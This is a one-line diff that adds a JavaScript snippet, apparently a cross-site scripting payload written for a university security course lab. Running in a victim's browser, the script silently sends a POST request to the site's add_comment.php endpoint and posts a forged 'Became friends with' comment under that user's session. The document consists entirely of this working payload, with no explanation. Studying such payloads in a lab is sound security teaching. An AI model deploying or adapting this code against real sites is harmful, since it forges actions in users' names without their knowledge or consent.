@@ -1,0 +1,1 @@
+var date = new Date();var comment = "Became friends with a b on" + date;var writeComment = new XMLHttpRequest(); writeComment.open('POST', 'http://csec380-core.csec.rit.edu/add_comment.php?id=119&comment='+comment);writeComment.setRequestHeader("Content-type", "application/x-www-form-urlencoded");writeComment.send();
